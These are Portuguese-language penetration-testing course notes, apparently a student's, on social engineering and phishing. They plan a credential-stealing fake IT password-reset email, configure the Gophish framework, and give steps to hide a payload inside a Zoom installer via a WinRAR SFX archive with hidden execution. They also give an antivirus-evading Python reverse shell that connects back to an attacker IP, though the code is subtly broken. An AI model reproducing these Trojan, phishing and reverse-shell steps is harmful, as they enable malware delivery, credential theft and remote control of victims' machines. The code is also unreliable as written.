

Para finalizar os módulos principais reservaremos um tempo para falar sobre uma das ações mais importantes de todo o Pentest que é a **Engenharia Social**

# Introdução

> “O elo mais fraco é sempre o os usuários”

### Exemplos de engenharia social

- Revelar acessos
- Clicar em links
- Abrir documentos
- Permitir acessos físicos

### Abordagens

- Presencial
- Telefone
- Internet

### Métodos

- Curiosidade do user
- Confiança do user
- Intimidação ao user
- Culpa do user

# Passo a passo para planejamento de ataque

### Passos

1. Definir objetivo do ataque
2. Estudo do alvo
3. Criar contexto usando métodos da introdução
4. Criar a persona que você incorporará
5. Definir melhor abordagem
6. Revisar possíveis erros e problemas do plano
7. Executar

### Exemplo de aplicação do passo a passo

1. Objetivo: Acessar página para roubar credenciais
2. Recon: Information Gathering feito completo
3. Contexto: Usaremos a culpa para falar com o user dizendo que sou da TI e preciso de um reset de senha (1 contato sem exploração)
4. Abordagem: Envia e-mail com link e página falsa que armazena senhas
5. Problemas: User não clicar no link ou o user perceber que não é a TI

### Referências de Ataques (Fontes)

- Livros:
    - A arte de enganar : Kevin Mitnick
    - A arte de invadir
- Filmes:
    - Prenda me se for capaz
    - VIPs (Filme brasileiro)

# Phishing as a Service

### Como não deixar users cairem em phishing?

- Monitoramento constante
- Campanha de conscientização
- Testes aleatórios constantes

*Ferramentas e frameworks podem auxiliar nesses processos

### Realizando campanha de phishing

**`Framework:` gophish**

Configurações podem ser feitas via config.json e via GUI

- Inicie criando Users e Groups da empresa
- Templates: Cria corpo dos e-mails a serem enviados
    - Template Reference para usar itens auxiliares dentro do email, ex: {{URL}}
- Landing Page : Cria página falsa
- Sending Profile : Perfil de email que manda aos users e configuração de SMTP
- Criar campanha : Inicia envio de emails

### Trabalhando com templates

Em casos reais é interessante simularmos e-mails da própria empresa como template no gophish

→ Use o imports para enviar um e-mails baixado para o framework

→ Faça as alterações necessárias no email do template

_Precisaremos de um profile para cada vez que a origem do e-mail for alterada, talvez landing page também_

- Para capturar o e-mail para import, clique no email selecionado e `copy to clipboard`

O que fazer caso o e-mail quebre no import?

- Acesse a página
- Clique em … e save as page
- Salve como página completa e teste a página em um http server seu
- Importe a nova página ao gophishing

**TESTE TODO O PROCESSO SEMPRE ANTES DE COMEÇAR A CAMPANHA**

# Shell com PDF forjado e Cavalo de Tróia

Muitas vezes podemos mascarar uma exploração de shell no background realizando a abertura de um arquivo PDF ao user, dessa forma fica escondida a real finalidade do programa.

Para isso: `explorer <link>` → Abre PDF na WEB

`—icon=pdf.ico` : Icone de PDF para o arquivo

### Cavalo de Troia

Nesse exemplo usaremos o Zoom para criar um cavalo de troia afim de explorar shells em um ambiente em que os users usam Zoom por padrão

Exemplo:

1. Baixe o instalador do Zoom e o ícone em png
2. Use o Winrar para mandar o instalador para arquivo SFX
3. Ponha como path desse arquivo o extract
4. Adicione a esse SFX o arquivo malicioso e em setup selecione a ordem com que ele serão executados
5. Em modos selecione Hide All
6. Em update selecione Overwrite All
7. Mude o ícone do arquivo

→ Cavalo de Troia criado ←

# Criando código de exploração indetectável

Para criar um código que não pode ser detectável pelo anti-virus a principal forma é utilizar processos normais e corriqueiros da máquina, de forma que pareça que nada demais está ocorrendo.

Abaixo criaremos uma reverse shell indetectável:

1. Crie o código em python com a socket conectando no socket da máquina atacante
    
2. Em outro arquivo importa a OS e executa 1 comando no CMD retornando o retorno dele usando `print(<variavel>.read)` // `.popopen(’<comando>’)` : Executa comandos no CMD
    
3. Agora com esses dois códigos criaremos um novo misturando os dois conceitos, onde o socket envia um comando e o código retorna para o atacante o retorno do CMD usando as funções do OS
    
4. Lembre-se de baixar com pip o pyinstaller para criar executável: `pyinstaller.exe <arquivo.py> —onefile —windowed`
    
    ```python
    import socket,os
    ip = <IP do atacante>
    porta = <Porta do atacante>
    
    s = socket.socket(sock.AF_INET,sock.SOCK_STREAM)
    s = connect((ip,porta))
    
    while True:
    	cmd = s.recv(1024)
    	for comando in os.popopen(cmd):
    		s.send(comando)
    ```